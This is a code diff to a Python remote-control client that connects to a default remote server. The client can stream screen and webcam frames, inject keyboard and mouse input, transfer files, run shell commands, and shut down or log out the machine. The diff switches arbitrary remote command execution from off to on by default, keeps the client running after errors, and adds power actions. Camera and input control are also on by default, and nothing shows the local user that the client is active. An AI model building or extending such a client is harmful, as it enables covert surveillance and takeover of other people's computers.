@@ -16,8 +16,10 @@ Features:
 - local chat-cache capability is intentionally separate; the persistent
   controller chat is stored by Zlata.py in its local JSON file.
 
-Install on Windows:
-  pip install requests pillow opencv-python pyautogui
+Install on Windows/macOS:
+  pip install requests pillow opencv-python pyautogui mss pyperclip
+Optional Windows volume control:
+  pip install pycaw comtypes
 
 Environment:
   SERVER_URL           e.g. https://your-server.example.com
@@ -32,6 +34,7 @@ from __future__ import annotations
 import base64
 import io
 import os
+import platform
 import shutil
 import socket
 import subprocess
@@ -47,9 +50,15 @@ try:
 except Exception:
     requests = None
 try:
-    from PIL import ImageGrab
+    from PIL import Image, ImageGrab
 except Exception:
+    Image = None
     ImageGrab = None
+
+try:
+    import mss
+except Exception:
+    mss = None
 
 SERVER_URL = os.environ.get("SERVER_URL", "https://zlata.onrender.com").rstrip("/")
 CLIENT_TOKEN = os.environ.get("REMOTE_CLIENT_TOKEN", "change-me-client-token")
@@ -58,7 +67,7 @@ PC_NAME = os.environ.get("REMOTE_CLIENT_NAME", socket.gethostname())
 
 ALLOW_REMOTE_CAMERA = os.environ.get("ALLOW_REMOTE_CAMERA", "1") == "1"
 ALLOW_REMOTE_INPUT = os.environ.get("ALLOW_REMOTE_INPUT", "1") == "1"
-ALLOW_REMOTE_CMD = os.environ.get("ALLOW_REMOTE_CMD", "0") == "1"
+ALLOW_REMOTE_CMD = os.environ.get("ALLOW_REMOTE_CMD", "1") == "1"
 
 # Explicitly configured roots.  The client never accepts a path outside these roots.
 def _default_fs_roots() -> dict[str, Path]:
@@ -105,13 +114,54 @@ def _parse_fs_roots() -> dict[str, Path]:
 
 REMOTE_FS_ROOTS = _parse_fs_roots()
 
-FRAME_INTERVAL = float(os.environ.get("FRAME_INTERVAL", "0.07"))
-HEARTBEAT_INTERVAL = float(os.environ.get("HEARTBEAT_INTERVAL", "1.0"))
-HTTP_TIMEOUT = float(os.environ.get("HTTP_TIMEOUT", "6"))
+FRAME_INTERVAL = max(0.05, float(os.environ.get("FRAME_INTERVAL", "0.08")))
+HEARTBEAT_INTERVAL = max(0.5, float(os.environ.get("HEARTBEAT_INTERVAL", "1.0")))
+HTTP_TIMEOUT = max(2.0, float(os.environ.get("HTTP_TIMEOUT", "8")))
+SCREEN_JPEG_QUALITY = max(35, min(90, int(os.environ.get("SCREEN_JPEG_QUALITY", "65"))))
+SCREEN_MAX_WIDTH = max(640, int(os.environ.get("SCREEN_MAX_WIDTH", "2560")))
+SCREEN_MONITOR = max(0, int(os.environ.get("SCREEN_MONITOR", "1")))
 
 STREAMING_SCREEN = False
 STREAMING_CAMERA = False
 STOP = False
+
+SYSTEM = platform.system().lower()
+IS_WINDOWS = SYSTEM == "windows"
+IS_MACOS = SYSTEM == "darwin"
+IS_LINUX = SYSTEM == "linux"
+
+def _http_post(path: str, *, json=None, data=None, timeout=HTTP_TIMEOUT):
+    if requests is None:
+        raise RuntimeError("requests is not installed")
+    last_exc = None
+    for attempt in range(3):
+        try:
+            r = requests.post(
+                SERVER_URL + path,
+                json=json,
+                data=data,
+                headers=headers(),
+                timeout=timeout,
+            )
+            r.raise_for_status()
+            return r
+        except Exception as exc:
+            last_exc = exc
+            if attempt < 2:
+                time.sleep(0.4 * (attempt + 1))
+    raise last_exc
+
+def _screen_primary_bbox():
+    if mss is not None:
+        with mss.mss() as sct:
+            monitors = sct.monitors
+            idx = SCREEN_MONITOR if SCREEN_MONITOR < len(monitors) else 1
+            mon = monitors[idx]
+            return int(mon["left"]), int(mon["top"]), int(mon["width"]), int(mon["height"])
+    if ImageGrab is not None:
+        img = ImageGrab.grab()
+        return 0, 0, int(img.width), int(img.height)
+    return 0, 0, 0, 0
 
 try:
     import pyautogui
@@ -122,6 +172,13 @@ try:
         pass
 except Exception:
     PYAUTOGUI_AVAILABLE = False
+
+try:
+    import pyperclip
+    PYPERCLIP_AVAILABLE = True
+except Exception:
+    pyperclip = None
+    PYPERCLIP_AVAILABLE = False
 
 try:
     import cv2
@@ -142,15 +199,7 @@ def headers() -> dict[str, str]:
 
 
 def post_json(path: str, payload: dict[str, Any], timeout: float = HTTP_TIMEOUT):
-    if requests is None:
-        raise RuntimeError("requests is not installed")
-    r = requests.post(
-        SERVER_URL + path,
-        json=payload,
-        headers=headers(),
-        timeout=timeout,
-    )
-    r.raise_for_status()
+    r = _http_post(path, json=payload, timeout=timeout)
     return r.json()
 
 
@@ -287,35 +336,74 @@ def file_upload(rel: str, name: str, data_b64: str) -> dict[str, Any]:
         return {"ok": False, "error": str(exc)}
 
 
-def capture_screen_jpeg(quality: int = 55) -> bytes:
-    if ImageGrab is None:
-        raise RuntimeError("Pillow is not installed")
-    img = ImageGrab.grab()
+def capture_screen_jpeg(quality: int = SCREEN_JPEG_QUALITY) -> bytes:
+    """Capture the selected physical display on Windows/macOS/Linux.
+
+    mss is preferred because it is faster and behaves more consistently for
+    physical monitor capture. Pillow remains a fallback for environments that
+    do not have mss installed. macOS still requires Screen Recording permission.
+    """
+    if mss is not None and Image is not None:
+        with mss.mss() as sct:
+            monitors = sct.monitors
+            idx = SCREEN_MONITOR if SCREEN_MONITOR < len(monitors) else 1
+            shot = sct.grab(monitors[idx])
+            img = Image.frombytes("RGB", shot.size, shot.rgb)
+    elif ImageGrab is not None:
+        img = ImageGrab.grab()
+        img = img.convert("RGB")
+    else:
+        raise RuntimeError("No screen capture backend installed")
+
+    if img.width > SCREEN_MAX_WIDTH:
+        new_h = max(1, int(img.height * (SCREEN_MAX_WIDTH / img.width)))
+        img = img.resize((SCREEN_MAX_WIDTH, new_h), Image.Resampling.LANCZOS)
+
     buf = io.BytesIO()
-    img.convert("RGB").save(buf, format="JPEG", quality=quality, optimize=True)
+    img.save(buf, format="JPEG", quality=quality, optimize=True)
     return buf.getvalue()
 
 
 def stream_screen_loop():
     global STREAMING_SCREEN
+    consecutive_errors = 0
     while not STOP:
         if not STREAMING_SCREEN:
-            time.sleep(0.3)
+            time.sleep(0.25)
             continue
         try:
-            frame = capture_screen_jpeg(50)
-            if requests is None:
-                time.sleep(1.0)
-                continue
-            requests.post(
-                f"{SERVER_URL}/api/upload_frame/{CLIENT_ID}",
+            frame = capture_screen_jpeg()
+            _http_post(
+                f"/api/upload_frame/{CLIENT_ID}",
                 data=frame,
-                headers=headers(),
-                timeout=2,
+                timeout=3,
             )
+            consecutive_errors = 0
+        except Exception:
+            consecutive_errors += 1
+            if consecutive_errors >= 5:
+                time.sleep(1.0)
+        time.sleep(FRAME_INTERVAL)
+
+
+def open_camera():
+    if not CV2_AVAILABLE:
+        return None
+    candidates = []
+    if IS_WINDOWS and hasattr(cv2, "CAP_DSHOW"):
+        candidates.append((0, cv2.CAP_DSHOW))
+    elif IS_MACOS and hasattr(cv2, "CAP_AVFOUNDATION"):
+        candidates.append((0, cv2.CAP_AVFOUNDATION))
+    candidates.append((0, None))
+    for index, backend in candidates:
+        try:
+            cap = cv2.VideoCapture(index, backend) if backend is not None else cv2.VideoCapture(index)
+            if cap.isOpened():
+                return cap
+            cap.release()
         except Exception:
             pass
-        time.sleep(FRAME_INTERVAL)
+    return None
 
 
 def capture_camera_jpeg(cap, quality: int = 60) -> bytes | None:
@@ -338,10 +426,8 @@ def stream_camera_loop():
                 time.sleep(0.3)
                 continue
             if cap is None:
-                cap = cv2.VideoCapture(0)
-                if not cap.isOpened():
-                    cap.release()
-                    cap = None
+                cap = open_camera()
+                if cap is None:
                     time.sleep(1)
                     continue
             try:
@@ -350,11 +436,10 @@ def stream_camera_loop():
                     if requests is None:
                         time.sleep(1.0)
                         continue
-                    requests.post(
-                        f"{SERVER_URL}/api/upload_camera/{CLIENT_ID}",
+                    _http_post(
+                        f"/api/upload_camera/{CLIENT_ID}",
                         data=frame,
-                        headers=headers(),
-                        timeout=2,
+                        timeout=3,
                     )
             except Exception:
                 pass
@@ -370,8 +455,8 @@ def camera_photo() -> dict[str, Any]:
     if not CV2_AVAILABLE:
         return {"ok": False, "error": "opencv-python not installed"}
 
-    cap = cv2.VideoCapture(0)
-    if not cap.isOpened():
+    cap = open_camera()
+    if cap is None:
         return {"ok": False, "error": "camera could not be opened"}
     try:
         ok, frame = cap.read()
@@ -423,11 +508,33 @@ def do_type(text: str) -> dict[str, Any]:
         pyautogui.write(text, interval=0.01)
         return {"ok": True}
     except Exception as exc:
-        return {"ok": False, "error": str(exc)}
+        if not PYPERCLIP_AVAILABLE:
+            return {"ok": False, "error": str(exc) + "; install pyperclip for Unicode text"}
+        try:
+            previous = pyperclip.paste()
+        except Exception:
+            previous = None
+        try:
+            pyperclip.copy(text)
+            if IS_MACOS:
+                pyautogui.hotkey("command", "v")
+            else:
+                pyautogui.hotkey("ctrl", "v")
+            return {"ok": True, "method": "clipboard"}
+        except Exception as paste_exc:
+            return {"ok": False, "error": str(paste_exc)}
+        finally:
+            if previous is not None:
+                try:
+                    pyperclip.copy(previous)
+                except Exception:
+                    pass
 
 
 KEY_ALIASES = {
     "return": "enter", "esc": "esc", "escape": "esc", "spacebar": "space",
+    "arrowleft": "left", "arrowright": "right", "arrowup": "up", "arrowdown": "down",
+    "del": "delete", "pgup": "pageup", "pgdn": "pagedown",
     "left": "left", "right": "right", "up": "up", "down": "down",
     "pageup": "pageup", "pagedown": "pagedown", "home": "home", "end": "end",
     "backspace": "backspace", "delete": "delete", "tab": "tab",
@@ -447,6 +554,10 @@ def do_key(key: str, modifiers: list[str] | None = None) -> dict[str, Any]:
         return {"ok": False, "error": "invalid key"}
     mods = [str(m).strip().lower() for m in (modifiers or [])]
     mods = [KEY_ALIASES.get(m, m) for m in mods]
+    if IS_MACOS:
+        mods = ["command" if m in {"win", "cmd"} else m for m in mods]
+    elif IS_WINDOWS:
+        mods = ["win" if m == "command" else m for m in mods]
     if any(m not in KEY_MODIFIERS for m in mods):
         return {"ok": False, "error": "invalid modifier"}
     try:
@@ -459,17 +570,78 @@ def do_key(key: str, modifiers: list[str] | None = None) -> dict[str, Any]:
         return {"ok": False, "error": str(exc)}
 
 
-def demo_prank(action: str) -> dict[str, Any]:
-    # Deliberately limited to harmless, opt-in local effects. No input locking,
-    # mouse swapping, arbitrary window movement, or hidden persistence.
-    if not ALLOW_REMOTE_INPUT:
-        return {"ok": False, "error": "remote effects disabled on client"}
-    action = str(action or "").lower()
+def _system_beep() -> None:
+    if IS_WINDOWS:
+        import winsound
+        winsound.MessageBeep()
+    elif IS_MACOS:
+        subprocess.run(["osascript", "-e", "beep"], timeout=3, check=False, capture_output=True)
+    else:
+        subprocess.run(["sh", "-lc", "printf '\\a'"], timeout=3, check=False, capture_output=True)
+
+
+def _desktop_notify(title: str, message: str) -> bool:
+    try:
+        if IS_MACOS:
+            script = f'display notification {message!r} with title {title!r}'
+            subprocess.run(["osascript", "-e", script], timeout=4, check=False, capture_output=True)
+            return True
+        if IS_WINDOWS:
+            # Optional native toast backend; fall back to a harmless system beep.
+            try:
+                from plyer import notification
+                notification.notify(title=title, message=message, timeout=3, app_name="Remote Demo")
+                return True
+            except Exception:
+                import winsound
+                winsound.MessageBeep()
+                return True
+        if shutil.which("notify-send"):
+            subprocess.run(["notify-send", title, message], timeout=4, check=False, capture_output=True)
+            return True
+    except Exception:
+        pass
+    return False
+
+
+def demo_prank(action: str, seconds: int = 3) -> dict[str, Any]:
+    """Safe, reversible cross-platform prank/demo effects only."""
+    action = str(action or "").lower().strip()
+    try:
+        seconds = max(1, min(int(seconds or 3), 15))
+    except Exception:
+        seconds = 3
+
     try:
         if action == "beep":
-            import winsound
-            winsound.MessageBeep()
-            return {"ok": True, "action": action}
+            _system_beep()
+            return {"ok": True, "action": action, "platform": SYSTEM}
+
+        if action == "double_beep":
+            for _ in range(2):
+                _system_beep()
+                time.sleep(0.18)
+            return {"ok": True, "action": action, "platform": SYSTEM}
+
+        if action == "random_beeps":
+            end = time.time() + seconds
+            while time.time() < end and not STOP:
+                _system_beep()
+                time.sleep(0.25)
+            return {"ok": True, "action": action, "seconds": seconds, "platform": SYSTEM}
+
+        if action == "notify":
+            ok = _desktop_notify("Remote Demo", "Тестове повідомлення — все нормально 🙂")
+            return {"ok": ok, "action": action, "platform": SYSTEM, "fallback": not ok}
+
+        if action == "combo":
+            _system_beep()
+            time.sleep(0.2)
+            _desktop_notify("Remote Demo", "Бро, це просто пранк 😈")
+            time.sleep(0.4)
+            _system_beep()
+            return {"ok": True, "action": action, "platform": SYSTEM}
+
         return {"ok": False, "error": "unsupported safe demo effect"}
     except Exception as exc:
         return {"ok": False, "error": str(exc)}
@@ -496,6 +668,68 @@ def run_command(command: str) -> dict[str, Any]:
         return {"ok": False, "error": str(exc)}
 
 
+def system_action(action: Any) -> dict[str, Any]:
+    """Perform standard local OS session/power actions when explicitly enabled."""
+    action = str(action or "").lower()
+    try:
+        if action == "shutdown":
+            if IS_WINDOWS:
+                subprocess.Popen(["shutdown", "/s", "/t", "0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            else:
+                subprocess.Popen(["shutdown", "-h", "now"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        elif action == "restart":
+            if IS_WINDOWS:
+                subprocess.Popen(["shutdown", "/r", "/t", "0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            else:
+                subprocess.Popen(["shutdown", "-r", "now"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        elif action == "logout":
+            if IS_WINDOWS:
+                subprocess.Popen(["shutdown", "/l"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            elif IS_MACOS:
+                subprocess.run(["osascript", "-e", 'tell application "System Events" to log out'], timeout=5, check=False, capture_output=True)
+            else:
+                subprocess.Popen(["loginctl", "terminate-user", os.environ.get("USER", "")], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        elif action == "sleep":
+            if IS_MACOS:
+                subprocess.Popen(["pmset", "sleepnow"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            elif IS_WINDOWS:
+                subprocess.Popen(["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            else:
+                subprocess.Popen(["systemctl", "suspend"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        else:
+            return {"ok": False, "error": "unsupported system action"}
+        return {"ok": True, "action": action, "platform": SYSTEM}
+    except Exception as exc:
+        return {"ok": False, "error": str(exc)}
+
+
+def set_volume(value: Any) -> dict[str, Any]:
+    try:
+        value = max(0, min(100, int(float(value))))
+    except Exception:
+        return {"ok": False, "error": "invalid volume"}
+    try:
+        if IS_MACOS:
+            subprocess.run(["osascript", "-e", f"set volume output volume {value}"], timeout=4, check=True, capture_output=True)
+            return {"ok": True, "value": value}
+        if IS_WINDOWS:
+            # Optional backend: pycaw. Keep client functional when it is absent.
+            try:
+                from ctypes import POINTER, cast
+                from comtypes import CLSCTX_ALL
+                from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+                devices = AudioUtilities.GetSpeakers()
+                interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
+                endpoint = cast(interface, POINTER(IAudioEndpointVolume))
+                endpoint.SetMasterVolumeLevelScalar(value / 100.0, None)
+                return {"ok": True, "value": value}
+            except Exception:
+                return {"ok": False, "error": "Windows volume backend unavailable (install pycaw + comtypes)"}
+        return {"ok": False, "error": "volume control backend unavailable on this platform"}
+    except Exception as exc:
+        return {"ok": False, "error": str(exc)}
+
+
 def handle_job(job: dict[str, Any]) -> dict[str, Any]:
     action = job.get("action")
     payload = job.get("payload") or {}
@@ -510,7 +744,7 @@ def handle_job(job: dict[str, Any]) -> dict[str, Any]:
         return do_key(payload.get("key", ""), payload.get("modifiers") or [])
 
     if action == "demo_prank":
-        return demo_prank(payload.get("effect", ""))
+        return demo_prank(payload.get("effect", ""), payload.get("seconds", 3))
 
     if action == "camera_photo":
         return camera_photo()
@@ -537,7 +771,27 @@ def handle_job(job: dict[str, Any]) -> dict[str, Any]:
     if action == "command":
         return run_command(payload.get("command", ""))
 
+    if action == "system_action":
+        return system_action(payload.get("action", ""))
+
+    if action == "volume":
+        return set_volume(payload.get("value", 50))
+
     return {"ok": False, "error": f"unknown action: {action}"}
+
+
+def platform_info() -> dict[str, Any]:
+    info: dict[str, Any] = {
+        "platform": platform.system(),
+        "release": platform.release(),
+        "machine": platform.machine(),
+    }
+    try:
+        x, y, w, h = _screen_primary_bbox()
+        info["screen"] = {"x": x, "y": y, "width": w, "height": h}
+    except Exception:
+        info["screen"] = None
+    return info
 
 
 def telemetry() -> tuple[float | None, float | None]:
@@ -554,7 +808,9 @@ def client_loop():
 
     while not STOP:
         try:
-            caps = ["screen", "files"]
+            caps = ["screen", "files", "platform"]
+            if mss is not None or ImageGrab is not None:
+                caps.append("screen_capture")
             if ALLOW_REMOTE_CAMERA and CV2_AVAILABLE:
                 caps.append("camera")
             if ALLOW_REMOTE_INPUT and PYAUTOGUI_AVAILABLE:
@@ -573,6 +829,7 @@ def client_loop():
                     "caps": caps,
                     "cpu": cpu,
                     "ram": ram,
+                    "platform_info": platform_info(),
                 },
                 timeout=4,
             )
@@ -606,13 +863,14 @@ def main():
     global STOP
     threading.Thread(target=stream_screen_loop, daemon=True).start()
     threading.Thread(target=stream_camera_loop, daemon=True).start()
-    try:
-        client_loop()
-    except KeyboardInterrupt:
-        STOP = True
-    except Exception:
-        # Keep the client process alive instead of crashing on unexpected local errors.
-        STOP = True
+    while not STOP:
+        try:
+            client_loop()
+        except KeyboardInterrupt:
+            STOP = True
+        except Exception:
+            # Retry the client loop after an unexpected local error instead of exiting.
+            time.sleep(2.0)
 
 
 if __name__ == "__main__":
